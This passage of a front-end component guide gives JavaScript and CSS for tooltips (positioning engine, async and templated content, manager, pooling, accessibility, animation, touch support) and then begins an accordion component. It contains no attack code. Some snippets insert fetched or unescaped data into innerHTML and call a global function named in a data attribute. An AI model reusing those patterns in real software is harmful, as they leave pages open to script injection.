    window.removeEventListener('scroll', this.handleScroll, true);
    window.removeEventListener('resize', this.handleResize);
    
    this.trigger.dispatchEvent(new CustomEvent('tooltip:hide'));
  }
  
  toggle() {
    this.isVisible ? this.hide() : this.show();
  }
  
  handleScroll = () => {
    if (this.isVisible) {
      this.position();
    }
  };
  
  handleResize = () => {
    if (this.isVisible) {
      this.position();
    }
  };
  
  destroy() {
    this.hide();
    
    const { trigger } = this.options;
    
    this.trigger.removeEventListener('mouseenter', this.handleMouseEnter);
    this.trigger.removeEventListener('mouseleave', this.handleMouseLeave);
    this.trigger.removeEventListener('focus', this.handleFocus);
    this.trigger.removeEventListener('blur', this.handleBlur);
    this.trigger.removeEventListener('click', this.handleClick);
    
    if (this.tooltip) {
      this.tooltip.removeEventListener('mouseenter', this.handleTooltipMouseEnter);
      this.tooltip.removeEventListener('mouseleave', this.handleTooltipMouseLeave);
    }
    
    this.trigger.removeAttribute('aria-describedby');
    
    this.isDestroyed = true;
  }
  
  position() {
    const triggerRect = this.trigger.getBoundingClientRect();
    const tooltipRect = this.tooltip.getBoundingClientRect();
    const { placement, offset } = this.options;
    
    const positions = this.calculatePosition(triggerRect, tooltipRect, placement, offset);
    
    this.tooltip.style.left = `${positions.x}px`;
    this.tooltip.style.top = `${positions.y}px`;
    
    if (this.arrow) {
      this.positionArrow(positions.placement, triggerRect, tooltipRect);
    }
  }
  
  calculatePosition(triggerRect, tooltipRect, preferredPlacement, offset) {
    const viewport = {
      width: window.innerWidth,
      height: window.innerHeight
    };
    
    const positions = {
      top: {
        x: triggerRect.left + (triggerRect.width / 2) - (tooltipRect.width / 2),
        y: triggerRect.top - tooltipRect.height - offset
      },
      bottom: {
        x: triggerRect.left + (triggerRect.width / 2) - (tooltipRect.width / 2),
        y: triggerRect.bottom + offset
      },
      left: {
        x: triggerRect.left - tooltipRect.width - offset,
        y: triggerRect.top + (triggerRect.height / 2) - (tooltipRect.height / 2)
      },
      right: {
        x: triggerRect.right + offset,
        y: triggerRect.top + (triggerRect.height / 2) - (tooltipRect.height / 2)
      }
    };
    
    // Check if preferred placement fits
    let placement = preferredPlacement;
    let pos = positions[placement];
    
    // Flip if doesn't fit
    if (!this.fitsInViewport(pos, tooltipRect, viewport)) {
      const flips = {
        top: 'bottom',
        bottom: 'top',
        left: 'right',
        right: 'left'
      };
      
      placement = flips[placement];
      pos = positions[placement];
      
      // If still doesn't fit, try other placements
      if (!this.fitsInViewport(pos, tooltipRect, viewport)) {
        const placements = ['top', 'bottom', 'left', 'right'];
        for (const p of placements) {
          const testPos = positions[p];
          if (this.fitsInViewport(testPos, tooltipRect, viewport)) {
            placement = p;
            pos = testPos;
            break;
          }
        }
      }
    }
    
    // Adjust position to stay within viewport
    pos = this.adjustForViewport(pos, tooltipRect, viewport);
    
    return { ...pos, placement };
  }
  
  fitsInViewport(pos, rect, viewport) {
    return (
      pos.x >= 0 &&
      pos.y >= 0 &&
      pos.x + rect.width <= viewport.width &&
      pos.y + rect.height <= viewport.height
    );
  }
  
  adjustForViewport(pos, rect, viewport) {
    const adjusted = { ...pos };
    
    // Horizontal adjustment
    if (adjusted.x < 0) {
      adjusted.x = 8; // Minimum padding
    } else if (adjusted.x + rect.width > viewport.width) {
      adjusted.x = viewport.width - rect.width - 8;
    }
    
    // Vertical adjustment
    if (adjusted.y < 0) {
      adjusted.y = 8;
    } else if (adjusted.y + rect.height > viewport.height) {
      adjusted.y = viewport.height - rect.height - 8;
    }
    
    return adjusted;
  }
  
  positionArrow(placement, triggerRect, tooltipRect) {
    const arrowSize = 8;
    
    if (placement === 'top' || placement === 'bottom') {
      const triggerCenter = triggerRect.left + (triggerRect.width / 2);
      const tooltipLeft = parseFloat(this.tooltip.style.left);
      const arrowLeft = triggerCenter - tooltipLeft - arrowSize;
      
      this.arrow.style.left = `${arrowLeft}px`;
      this.arrow.style.top = placement === 'top' ? 'auto' : `-${arrowSize}px`;
      this.arrow.style.bottom = placement === 'top' ? `-${arrowSize}px` : 'auto';
    } else {
      const triggerCenter = triggerRect.top + (triggerRect.height / 2);
      const tooltipTop = parseFloat(this.tooltip.style.top);
      const arrowTop = triggerCenter - tooltipTop - arrowSize;
      
      this.arrow.style.top = `${arrowTop}px`;
      this.arrow.style.left = placement === 'left' ? 'auto' : `-${arrowSize}px`;
      this.arrow.style.right = placement === 'left' ? `-${arrowSize}px` : 'auto';
    }
  }
}
```

### Positioning Engine

#### Advanced Positioning with Collision Detection

```javascript
class PositionEngine {
  constructor() {
    this.placements = [
      'top', 'top-start', 'top-end',
      'bottom', 'bottom-start', 'bottom-end',
      'left', 'left-start', 'left-end',
      'right', 'right-start', 'right-end'
    ];
  }
  
  compute(reference, floating, options = {}) {
    const {
      placement = 'top',
      offset = 8,
      shift = true,
      flip = true,
      autoPlacement = false
    } = options;
    
    const refRect = reference.getBoundingClientRect();
    const floatRect = floating.getBoundingClientRect();
    const viewport = this.getViewport();
    
    let finalPlacement = placement;
    let position;
    
    if (autoPlacement) {
      finalPlacement = this.findBestPlacement(refRect, floatRect, viewport, offset);
    }
    
    position = this.getPosition(refRect, floatRect, finalPlacement, offset);
    
    if (flip) {
      const collision = this.detectCollision(position, floatRect, viewport);
      if (collision) {
        finalPlacement = this.getFlippedPlacement(finalPlacement);
        position = this.getPosition(refRect, floatRect, finalPlacement, offset);
      }
    }
    
    if (shift) {
      position = this.applyShift(position, floatRect, viewport);
    }
    
    return {
      x: position.x,
      y: position.y,
      placement: finalPlacement,
      arrow: this.getArrowPosition(refRect, floatRect, finalPlacement, position)
    };
  }
  
  getPosition(refRect, floatRect, placement, offset) {
    const [side, alignment] = placement.split('-');
    
    const basePositions = {
      top: {
        x: refRect.left + (refRect.width / 2) - (floatRect.width / 2),
        y: refRect.top - floatRect.height - offset
      },
      bottom: {
        x: refRect.left + (refRect.width / 2) - (floatRect.width / 2),
        y: refRect.bottom + offset
      },
      left: {
        x: refRect.left - floatRect.width - offset,
        y: refRect.top + (refRect.height / 2) - (floatRect.height / 2)
      },
      right: {
        x: refRect.right + offset,
        y: refRect.top + (refRect.height / 2) - (floatRect.height / 2)
      }
    };
    
    let pos = basePositions[side];
    
    // Apply alignment
    if (alignment === 'start') {
      if (side === 'top' || side === 'bottom') {
        pos.x = refRect.left;
      } else {
        pos.y = refRect.top;
      }
    } else if (alignment === 'end') {
      if (side === 'top' || side === 'bottom') {
        pos.x = refRect.right - floatRect.width;
      } else {
        pos.y = refRect.bottom - floatRect.height;
      }
    }
    
    return pos;
  }
  
  detectCollision(position, floatRect, viewport) {
    return (
      position.x < 0 ||
      position.y < 0 ||
      position.x + floatRect.width > viewport.width ||
      position.y + floatRect.height > viewport.height
    );
  }
  
  getFlippedPlacement(placement) {
    const flips = {
      'top': 'bottom',
      'top-start': 'bottom-start',
      'top-end': 'bottom-end',
      'bottom': 'top',
      'bottom-start': 'top-start',
      'bottom-end': 'top-end',
      'left': 'right',
      'left-start': 'right-start',
      'left-end': 'right-end',
      'right': 'left',
      'right-start': 'left-start',
      'right-end': 'left-end'
    };
    return flips[placement] || placement;
  }
  
  applyShift(position, floatRect, viewport, padding = 8) {
    const shifted = { ...position };
    
    if (shifted.x < padding) {
      shifted.x = padding;
    } else if (shifted.x + floatRect.width > viewport.width - padding) {
      shifted.x = viewport.width - floatRect.width - padding;
    }
    
    if (shifted.y < padding) {
      shifted.y = padding;
    } else if (shifted.y + floatRect.height > viewport.height - padding) {
      shifted.y = viewport.height - floatRect.height - padding;
    }
    
    return shifted;
  }
  
  findBestPlacement(refRect, floatRect, viewport, offset) {
    const availableSpace = {
      top: refRect.top - offset,
      bottom: viewport.height - refRect.bottom - offset,
      left: refRect.left - offset,
      right: viewport.width - refRect.right - offset
    };
    
    const requiredSpace = {
      top: floatRect.height,
      bottom: floatRect.height,
      left: floatRect.width,
      right: floatRect.width
    };
    
    // Find side with most space where tooltip fits
    let bestSide = 'top';
    let maxSpace = availableSpace.top;
    
    for (const side of ['bottom', 'left', 'right']) {
      if (availableSpace[side] >= requiredSpace[side] && 
          availableSpace[side] > maxSpace) {
        bestSide = side;
        maxSpace = availableSpace[side];
      }
    }
    
    // If no side fits, use side with most space
    if (maxSpace < requiredSpace[bestSide]) {
      maxSpace = -Infinity;
      for (const side of ['top', 'bottom', 'left', 'right']) {
        if (availableSpace[side] > maxSpace) {
          bestSide = side;
          maxSpace = availableSpace[side];
        }
      }
    }
    
    return bestSide;
  }
  
  getArrowPosition(refRect, floatRect, placement, position) {
    const [side] = placement.split('-');
    const arrowSize = 8;
    
    const arrow = { x: 0, y: 0 };
    
    if (side === 'top' || side === 'bottom') {
      const refCenter = refRect.left + (refRect.width / 2);
      arrow.x = refCenter - position.x - arrowSize;
      arrow.y = side === 'top' ? floatRect.height : -arrowSize;
    } else {
      const refCenter = refRect.top + (refRect.height / 2);
      arrow.y = refCenter - position.y - arrowSize;
      arrow.x = side === 'left' ? floatRect.width : -arrowSize;
    }
    
    return arrow;
  }
  
  getViewport() {
    return {
      width: window.innerWidth,
      height: window.innerHeight
    };
  }
}
```

### Virtual Positioning (Floating UI Pattern)

```javascript
class VirtualElement {
  constructor(x, y, width = 0, height = 0) {
    this.x = x;
    this.y = y;
    this.width = width;
    this.height = height;
  }
  
  getBoundingClientRect() {
    return {
      x: this.x,
      y: this.y,
      width: this.width,
      height: this.height,
      top: this.y,
      right: this.x + this.width,
      bottom: this.y + this.height,
      left: this.x
    };
  }
}

class ContextMenuTooltip {
  constructor() {
    this.tooltip = null;
    this.virtualElement = null;
  }
  
  showAtCursor(event, content) {
    // Create virtual element at cursor position
    this.virtualElement = new VirtualElement(
      event.clientX,
      event.clientY,
      1,
      1
    );
    
    this.show(this.virtualElement, content);
  }
  
  showAtSelection(content) {
    const selection = window.getSelection();
    if (!selection.rangeCount) return;
    
    const range = selection.getRangeAt(0);
    const rect = range.getBoundingClientRect();
    
    this.virtualElement = new VirtualElement(
      rect.x,
      rect.y,
      rect.width,
      rect.height
    );
    
    this.show(this.virtualElement, content);
  }
  
  show(reference, content) {
    if (!this.tooltip) {
      this.tooltip = document.createElement('div');
      this.tooltip.className = 'context-tooltip';
      document.body.appendChild(this.tooltip);
    }
    
    this.tooltip.textContent = content;
    
    const positionEngine = new PositionEngine();
    const position = positionEngine.compute(reference, this.tooltip, {
      placement: 'bottom',
      autoPlacement: true
    });
    
    this.tooltip.style.left = `${position.x}px`;
    this.tooltip.style.top = `${position.y}px`;
    this.tooltip.classList.add('visible');
  }
  
  hide() {
    if (this.tooltip) {
      this.tooltip.classList.remove('visible');
    }
  }
}
```

### Content Management

#### Dynamic Content Loading

```javascript
class AsyncTooltip extends Tooltip {
  constructor(options = {}) {
    super(options);
    this.contentCache = new Map();
    this.loadingTemplate = options.loadingTemplate || 'Loading...';
    this.errorTemplate = options.errorTemplate || 'Failed to load';
  }
  
  async show() {
    if (this.isVisible) return;
    
    const contentSource = this.trigger.dataset.tooltipContent;
    const cacheKey = this.trigger.dataset.tooltipCache;
    
    // Show loading state
    this.setContent(this.loadingTemplate);
    super.show();
    
    try {
      let content;
      
      if (cacheKey && this.contentCache.has(cacheKey)) {
        content = this.contentCache.get(cacheKey);
      } else {
        content = await this.loadContent(contentSource);
        
        if (cacheKey) {
          this.contentCache.set(cacheKey, content);
        }
      }
      
      this.setContent(content);
      this.position(); // Reposition after content change
      
    } catch (error) {
      this.setContent(this.errorTemplate);
      console.error('Tooltip content load failed:', error);
    }
  }
  
  async loadContent(source) {
    // If source is a URL
    if (source.startsWith('http') || source.startsWith('/')) {
      const response = await fetch(source);
      if (!response.ok) throw new Error('Network response failed');
      return await response.text();
    }
    
    // If source is a selector
    if (source.startsWith('#') || source.startsWith('.')) {
      const element = document.querySelector(source);
      return element ? element.innerHTML : '';
    }
    
    // If source is a function name
    if (typeof window[source] === 'function') {
      return await window[source](this.trigger);
    }
    
    return source;
  }
  
  setContent(content) {
    if (typeof content === 'string') {
      this.tooltip.innerHTML = content;
    } else if (content instanceof HTMLElement) {
      this.tooltip.innerHTML = '';
      this.tooltip.appendChild(content.cloneNode(true));
    }
  }
}
```

#### Rich Content Templates

```javascript
class RichTooltip extends Tooltip {
  constructor(options = {}) {
    super(options);
    this.templates = {
      default: (data) => `<div class="tooltip-content">${data.text}</div>`,
      card: (data) => `
        <div class="tooltip-card">
          ${data.image ? `<img src="${data.image}" alt="">` : ''}
          <div class="tooltip-card-body">
            ${data.title ? `<h4>${data.title}</h4>` : ''}
            ${data.description ? `<p>${data.description}</p>` : ''}
          </div>
        </div>
      `,
      list: (data) => `
        <div class="tooltip-list">
          ${data.title ? `<h4>${data.title}</h4>` : ''}
          <ul>
            ${data.items.map(item => `<li>${item}</li>`).join('')}
          </ul>
        </div>
      `,
      action: (data) => `
        <div class="tooltip-action">
          <div class="tooltip-action-content">${data.text}</div>
          <div class="tooltip-action-buttons">
            ${data.buttons.map(btn => 
              `<button data-action="${btn.action}">${btn.label}</button>`
            ).join('')}
          </div>
        </div>
      `
    };
  }
  
  create(triggerElement, content) {
    super.create(triggerElement, '');
    
    const templateName = content.template || 'default';
    const template = this.templates[templateName];
    
    if (template) {
      this.tooltip.innerHTML = template(content);
      
      // Attach button handlers for action template
      if (templateName === 'action') {
        this.tooltip.querySelectorAll('[data-action]').forEach(btn => {
          btn.addEventListener('click', (e) => {
            const action = e.target.dataset.action;
            this.trigger.dispatchEvent(new CustomEvent('tooltip:action', {
              detail: { action, data: content }
            }));
            this.hide();
          });
        });
      }
    }
    
    return this;
  }
}
```

### Tooltip Manager

```javascript
class TooltipManager {
  constructor(options = {}) {
    this.tooltips = new Map();
    this.globalOptions = options;
    this.observer = null;
  }
  
  init() {
    // Initialize tooltips on existing elements
    this.scanDocument();
    
    // Watch for dynamically added elements
    this.observer = new MutationObserver((mutations) => {
      mutations.forEach(mutation => {
        mutation.addedNodes.forEach(node => {
          if (node.nodeType === 1) {
            this.initElement(node);
            node.querySelectorAll?.('[data-tooltip]').forEach(el => {
              this.initElement(el);
            });
          }
        });
      });
    });
    
    this.observer.observe(document.body, {
      childList: true,
      subtree: true
    });
    
    // Global click handler to close interactive tooltips
    document.addEventListener('click', (e) => {
      if (!e.target.closest('[data-tooltip]') && 
          !e.target.closest('.tooltip')) {
        this.hideAll();
      }
    });
    
    // Handle escape key
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') {
        this.hideAll();
      }
    });
  }
  
  scanDocument() {
    document.querySelectorAll('[data-tooltip]').forEach(el => {
      this.initElement(el);
    });
  }
  
  initElement(element) {
    if (this.tooltips.has(element)) return;
    
    const content = element.dataset.tooltip;
    const placement = element.dataset.tooltipPlacement;
    const trigger = element.dataset.tooltipTrigger;
    const delay = element.dataset.tooltipDelay;
    const interactive = element.hasAttribute('data-tooltip-interactive');
    
    const options = {
      ...this.globalOptions,
      placement,
      trigger,
      delay: delay ? parseInt(delay) : undefined,
      interactive
    };
    
    const tooltip = new Tooltip(options);
    tooltip.create(element, content);
    
    this.tooltips.set(element, tooltip);
  }
  
  get(element) {
    return this.tooltips.get(element);
  }
  
  show(element) {
    const tooltip = this.tooltips.get(element);
    if (tooltip) tooltip.show();
  }
  
  hide(element) {
    const tooltip = this.tooltips.get(element);
    if (tooltip) tooltip.hide();
  }
  
  hideAll() {
    this.tooltips.forEach(tooltip => tooltip.hide());
  }
  
  destroy(element) {
    const tooltip = this.tooltips.get(element);
    if (tooltip) {
      tooltip.destroy();
      this.tooltips.delete(element);
    }
  }
  
  destroyAll() {
    this.tooltips.forEach(tooltip => tooltip.destroy());
    this.tooltips.clear();
    
    if (this.observer) {
      this.observer.disconnect();
    }
  }
  
  update(element, content) {
    const tooltip = this.tooltips.get(element);
    if (tooltip && tooltip.tooltip) {
      tooltip.tooltip.textContent = content;
      if (tooltip.isVisible) {
        tooltip.position();
      }
    }
  }
}

// Usage
const manager = new TooltipManager({
  placement: 'top',
  delay: 300,
  offset: 10
});

manager.init();
```

### Performance Optimizations

#### Tooltip Pooling

```javascript
class TooltipPool {
  constructor(maxSize = 10) {
    this.pool = [];
    this.maxSize = maxSize;
    this.active = new Set();
  }
  
  acquire() {
    let tooltip;
    
    if (this.pool.length > 0) {
      tooltip = this.pool.pop();
      tooltip.reset();
    } else {
      tooltip = this.createTooltip();
    }
    
    this.active.add(tooltip);
    return tooltip;
  }
  
  release(tooltip) {
    if (!this.active.has(tooltip)) return;
    
    this.active.delete(tooltip);
    
    if (this.pool.length < this.maxSize) {
      tooltip.hide();
      this.pool.push(tooltip);
    } else {
      tooltip.destroy();
    }
  }
  
  createTooltip() {
    return new Tooltip();
  }
  
  clear() {
    this.pool.forEach(tooltip => tooltip.destroy());
    this.active.forEach(tooltip => tooltip.destroy());
    this.pool = [];
    this.active.clear();
  }
}
```

#### Intersection-Based Activation

```javascript
class LazyTooltipManager extends TooltipManager {
  constructor(options = {}) {
    super(options);
    this.intersectionObserver = null;
  }
  
  init() {
    this.intersectionObserver = new IntersectionObserver(
      (entries) => {
        entries.forEach(entry => {
          if (entry.isIntersecting) {
            // Element is visible, initialize tooltip
            if (!this.tooltips.has(entry.target)) {
              this.initElement(entry.target);
            }
          } else {
            // Element is not visible, destroy tooltip to save memory
            this.destroy(entry.target);
          }
        });
      },
      {
        rootMargin: '100px' // Start loading before element is visible
      }
    );
    
	document.querySelectorAll('[data-tooltip]').forEach(el => {
	    this.intersectionObserver.observe(el);
	});
	
	// Watch for new elements
	this.observer = new MutationObserver(mutations => {
	    mutations.forEach(mutation => {
	        mutation.addedNodes.forEach(node => {
	            if (
	                node.nodeType === 1 &&
	                node.hasAttribute?.('data-tooltip')
	            ) {
	                this.intersectionObserver.observe(node);
	            }
	        });
	    });
	});

	this.observer.observe(document.body, {
		childList: true,
		subtree: true,
	});
	}

	destroyAll() {
	    super.destroyAll();
	
	    if (this.intersectionObserver) {
	        this.intersectionObserver.disconnect();
	    }
	}
}
````

#### Debounced Positioning

```javascript
class OptimizedTooltip extends Tooltip {
  constructor(options = {}) {
    super(options);
    this.positionDebounceTime = options.positionDebounceTime || 16;
    this.debouncedPosition = this.debounce(
      () => super.position(),
      this.positionDebounceTime
    );
  }
  
  position() {
    this.debouncedPosition();
  }
  
  debounce(func, wait) {
    let timeout;
    let rafId;
    
    return function executedFunction(...args) {
      const later = () => {
        clearTimeout(timeout);
        cancelAnimationFrame(rafId);
        
        rafId = requestAnimationFrame(() => {
          func.apply(this, args);
        });
      };
      
      clearTimeout(timeout);
      timeout = setTimeout(later, wait);
    };
  }
  
  handleScroll = () => {
    if (this.isVisible) {
      // Check if trigger is still in viewport
      const rect = this.trigger.getBoundingClientRect();
      const inViewport = (
        rect.top >= 0 &&
        rect.left >= 0 &&
        rect.bottom <= window.innerHeight &&
        rect.right <= window.innerWidth
      );
      
      if (!inViewport) {
        this.hide();
      } else {
        this.position();
      }
    }
  };
}
````

### Accessibility Features

#### ARIA and Keyboard Support

```javascript
class AccessibleTooltip extends Tooltip {
  constructor(options = {}) {
    super(options);
    this.describedById = null;
  }
  
  create(triggerElement, content) {
    super.create(triggerElement, content);
    
    // Generate unique ID
    this.describedById = `tooltip-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
    this.tooltip.id = this.describedById;
    
    // Set ARIA attributes
    this.trigger.setAttribute('aria-describedby', this.describedById);
    this.tooltip.setAttribute('role', 'tooltip');
    
    // Make trigger focusable if not already
    if (!this.trigger.hasAttribute('tabindex') && 
        !this.isFocusable(this.trigger)) {
      this.trigger.setAttribute('tabindex', '0');
    }
    
    // Add keyboard support
    this.trigger.addEventListener('keydown', this.handleKeyDown);
    
    return this;
  }
  
  handleKeyDown = (e) => {
    // Show on Enter/Space if click trigger
    if (this.options.trigger === 'click') {
      if (e.key === 'Enter' || e.key === ' ') {
        e.preventDefault();
        this.toggle();
      }
    }
    
    // Hide on Escape
    if (e.key === 'Escape' && this.isVisible) {
      this.hide();
      this.trigger.focus();
    }
  };
  
  isFocusable(element) {
    const focusableTags = ['A', 'BUTTON', 'INPUT', 'SELECT', 'TEXTAREA'];
    return focusableTags.includes(element.tagName) || 
           element.hasAttribute('tabindex');
  }
  
  show() {
    super.show();
    
    // Announce to screen readers
    this.tooltip.setAttribute('aria-live', 'polite');
    
    // If interactive, manage focus
    if (this.options.interactive) {
      const firstFocusable = this.tooltip.querySelector(
        'button, a, input, select, textarea, [tabindex]:not([tabindex="-1"])'
      );
      
      if (firstFocusable) {
        // Save last focused element
        this.lastFocused = document.activeElement;
        
        // Trap focus within tooltip
        this.tooltip.addEventListener('keydown', this.trapFocus);
      }
    }
  }
  
  hide() {
    super.hide();
    
    // Restore focus if interactive
    if (this.options.interactive && this.lastFocused) {
      this.lastFocused.focus();
      this.lastFocused = null;
    }
    
    this.tooltip.removeEventListener('keydown', this.trapFocus);
  }
  
  trapFocus = (e) => {
    if (e.key !== 'Tab') return;
    
    const focusableElements = this.tooltip.querySelectorAll(
      'button, a, input, select, textarea, [tabindex]:not([tabindex="-1"])'
    );
    
    const firstFocusable = focusableElements[0];
    const lastFocusable = focusableElements[focusableElements.length - 1];
    
    if (e.shiftKey) {
      if (document.activeElement === firstFocusable) {
        lastFocusable.focus();
        e.preventDefault();
      }
    } else {
      if (document.activeElement === lastFocusable) {
        firstFocusable.focus();
        e.preventDefault();
      }
    }
  };
  
  destroy() {
    this.trigger.removeEventListener('keydown', this.handleKeyDown);
    this.trigger.removeAttribute('aria-describedby');
    super.destroy();
  }
}
```

### Animation System

#### CSS-Based Animations

```css
.tooltip {
  position: absolute;
  z-index: 9999;
  padding: 8px 12px;
  background: #333;
  color: white;
  border-radius: 4px;
  font-size: 14px;
  pointer-events: none;
  opacity: 0;
  transform: scale(0.9);
  transition: opacity 200ms ease, transform 200ms ease;
}

.tooltip-visible {
  opacity: 1;
  transform: scale(1);
  pointer-events: auto;
}

.tooltip-interactive {
  pointer-events: auto;
}

/* Placement-specific animations */
.tooltip[data-placement^="top"] {
  transform-origin: bottom center;
}

.tooltip[data-placement^="bottom"] {
  transform-origin: top center;
}

.tooltip[data-placement^="left"] {
  transform-origin: right center;
}

.tooltip[data-placement^="right"] {
  transform-origin: left center;
}

/* Arrow */
.tooltip-arrow {
  position: absolute;
  width: 16px;
  height: 16px;
  background: #333;
  transform: rotate(45deg);
}

.tooltip[data-placement^="top"] .tooltip-arrow {
  bottom: -4px;
}

.tooltip[data-placement^="bottom"] .tooltip-arrow {
  top: -4px;
}

.tooltip[data-placement^="left"] .tooltip-arrow {
  right: -4px;
}

.tooltip[data-placement^="right"] .tooltip-arrow {
  left: -4px;
}
```

#### JavaScript Animation Controller

```javascript
class AnimatedTooltip extends Tooltip {
  constructor(options = {}) {
    super(options);
    this.animationOptions = {
      duration: options.animationDuration || 200,
      easing: options.animationEasing || 'ease-out',
      type: options.animationType || 'fade' // fade, scale, slide
    };
  }
  
  show() {
    if (this.isVisible || this.isDestroyed) return;
    
    document.body.appendChild(this.tooltip);
    this.position();
    
    // Set initial state
    this.setInitialAnimationState();
    
    // Trigger reflow
    this.tooltip.offsetHeight;
    
    // Animate
    this.animate('show');
    
    this.isVisible = true;
    window.addEventListener('scroll', this.handleScroll, true);
    window.addEventListener('resize', this.handleResize);
    
    this.trigger.dispatchEvent(new CustomEvent('tooltip:show'));
  }
  
  hide() {
    if (!this.isVisible) return;
    
    this.animate('hide').then(() => {
      if (this.tooltip?.parentNode) {
        this.tooltip.parentNode.removeChild(this.tooltip);
      }
      this.isVisible = false;
    });
    
    window.removeEventListener('scroll', this.handleScroll, true);
    window.removeEventListener('resize', this.handleResize);
    
    this.trigger.dispatchEvent(new CustomEvent('tooltip:hide'));
  }
  
  setInitialAnimationState() {
    const { type } = this.animationOptions;
    
    if (type === 'fade') {
      this.tooltip.style.opacity = '0';
    } else if (type === 'scale') {
      this.tooltip.style.opacity = '0';
      this.tooltip.style.transform = 'scale(0.8)';
    } else if (type === 'slide') {
      const placement = this.options.placement;
      const offset = 10;
      
      this.tooltip.style.opacity = '0';
      
      if (placement.startsWith('top')) {
        this.tooltip.style.transform = `translateY(${offset}px)`;
      } else if (placement.startsWith('bottom')) {
        this.tooltip.style.transform = `translateY(-${offset}px)`;
      } else if (placement.startsWith('left')) {
        this.tooltip.style.transform = `translateX(${offset}px)`;
      } else if (placement.startsWith('right')) {
        this.tooltip.style.transform = `translateX(-${offset}px)`;
      }
    }
  }
  
  animate(direction) {
    const { duration, easing, type } = this.animationOptions;
    
    return new Promise(resolve => {
      const endState = direction === 'show' ? {
        opacity: '1',
        transform: type === 'scale' ? 'scale(1)' : 
                  type === 'slide' ? 'translate(0, 0)' : ''
      } : {
        opacity: '0',
        transform: type === 'scale' ? 'scale(0.8)' : 
                  type === 'slide' ? this.getSlideTransform() : ''
      };
      
      this.tooltip.style.transition = `all ${duration}ms ${easing}`;
      
      Object.assign(this.tooltip.style, endState);
      
      setTimeout(resolve, duration);
    });
  }
  
  getSlideTransform() {
    const placement = this.options.placement;
    const offset = 10;
    
    if (placement.startsWith('top')) return `translateY(${offset}px)`;
    if (placement.startsWith('bottom')) return `translateY(-${offset}px)`;
    if (placement.startsWith('left')) return `translateX(${offset}px)`;
    if (placement.startsWith('right')) return `translateX(-${offset}px)`;
    
    return '';
  }
}
```

### Touch and Mobile Support

```javascript
class MobileTooltip extends Tooltip {
  constructor(options = {}) {
    super(options);
    this.touchTimeout = null;
    this.isTouchDevice = 'ontouchstart' in window;
    this.longPressDelay = options.longPressDelay || 500;
  }
  
  attachListeners() {
    if (this.isTouchDevice) {
      this.trigger.addEventListener('touchstart', this.handleTouchStart, { passive: true });
      this.trigger.addEventListener('touchend', this.handleTouchEnd);
      this.trigger.addEventListener('touchmove', this.handleTouchMove, { passive: true });
    } else {
      super.attachListeners();
    }
  }
  
  handleTouchStart = (e) => {
    this.touchStartPos = {
      x: e.touches[0].clientX,
      y: e.touches[0].clientY
    };
    
    this.touchTimeout = setTimeout(() => {
      this.show();
    }, this.longPressDelay);
  };
  
  handleTouchMove = (e) => {
    if (!this.touchStartPos) return;
    
    const touch = e.touches[0];
    const deltaX = Math.abs(touch.clientX - this.touchStartPos.x);
    const deltaY = Math.abs(touch.clientY - this.touchStartPos.y);
    
    // Cancel if moved more than 10px
    if (deltaX > 10 || deltaY > 10) {
      clearTimeout(this.touchTimeout);
    }
  };
  
  handleTouchEnd = (e) => {
    clearTimeout(this.touchTimeout);
    
    // Quick tap toggles tooltip
    if (this.isVisible) {
      this.hide();
    }
  };
  
  show() {
    super.show();
    
    // On mobile, add overlay to close on outside tap
    if (this.isTouchDevice && !this.overlay) {
      this.overlay = document.createElement('div');
      this.overlay.className = 'tooltip-overlay';
      this.overlay.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 9998;
      `;
      
      this.overlay.addEventListener('touchstart', () => {
        this.hide();
      });
      
      document.body.appendChild(this.overlay);
    }
  }
  
  hide() {
    if (this.overlay) {
      this.overlay.remove();
      this.overlay = null;
    }
    
    super.hide();
  }
  
  destroy() {
    if (this.isTouchDevice) {
      this.trigger.removeEventListener('touchstart', this.handleTouchStart);
      this.trigger.removeEventListener('touchend', this.handleTouchEnd);
      this.trigger.removeEventListener('touchmove', this.handleTouchMove);
    }
    
    if (this.overlay) {
      this.overlay.remove();
    }
    
    super.destroy();
  }
}
```

This comprehensive overview covers tooltip architecture, positioning algorithms, content management, performance optimization, accessibility, animations, and mobile support patterns used in production tooltip systems.

---

## Accordion/Collapse Components

### Core Architecture Patterns

#### Single-Responsibility Structure

Separate concerns between container (accordion), items (panels), and controls (triggers) for maintainable component design.

```javascript
class Accordion {
  constructor(element, options = {}) {
    this.element = element;
    this.options = {
      allowMultiple: false,
      animationDuration: 300,
      defaultExpanded: null,
      ...options
    };
    
    this.panels = [];
    this.init();
  }
  
  init() {
    const panelElements = this.element.querySelectorAll('[data-accordion-panel]');
    panelElements.forEach((el, index) => {
      const panel = new AccordionPanel(el, this, index);
      this.panels.push(panel);
    });
    
    if (this.options.defaultExpanded !== null) {
      this.expand(this.options.defaultExpanded);
    }
  }
  
  expand(index) {
    const panel = this.panels[index];
    if (!panel) return;
    
    if (!this.options.allowMultiple) {
      this.panels.forEach((p, i) => {
        if (i !== index) p.collapse();
      });
    }
    
    panel.expand();
  }
  
  collapse(index) {
    const panel = this.panels[index];
    if (panel) panel.collapse();
  }
  
  toggle(index) {
    const panel = this.panels[index];
    if (panel) panel.toggle();
  }
}

class AccordionPanel {
  constructor(element, accordion, index) {
    this.element = element;
    this.accordion = accordion;
    this.index = index;
    this.isExpanded = false;
    
    this.trigger = element.querySelector('[data-accordion-trigger]');
    this.content = element.querySelector('[data-accordion-content]');
    this.contentInner = this.content.firstElementChild;
    
    this.setupAccessibility();
    this.attachEvents();
  }
  
  setupAccessibility() {
    const triggerId = `accordion-trigger-${this.index}`;
    const contentId = `accordion-content-${this.index}`;
    
    this.trigger.id = triggerId;
    this.content.id = contentId;
    
    this.trigger.setAttribute('aria-controls', contentId);
    this.trigger.setAttribute('aria-expanded', 'false');
    this.content.setAttribute('aria-labelledby', triggerId);
    this.content.setAttribute('role', 'region');
  }
  
  attachEvents() {
    this.handleClick = this.handleClick.bind(this);
    this.handleKeydown = this.handleKeydown.bind(this);
    
    this.trigger.addEventListener('click', this.handleClick);
    this.trigger.addEventListener('keydown', this.handleKeydown);
  }
  
  handleClick(e) {
    e.preventDefault();
    this.toggle();
  }
  
  handleKeydown(e) {
    // Handle keyboard navigation
    switch(e.key) {
      case 'ArrowDown':
        e.preventDefault();
        this.focusNext();
        break;
      case 'ArrowUp':
        e.preventDefault();
        this.focusPrevious();
        break;
      case 'Home':
        e.preventDefault();
        this.accordion.panels[0].trigger.focus();
        break;
      case 'End':
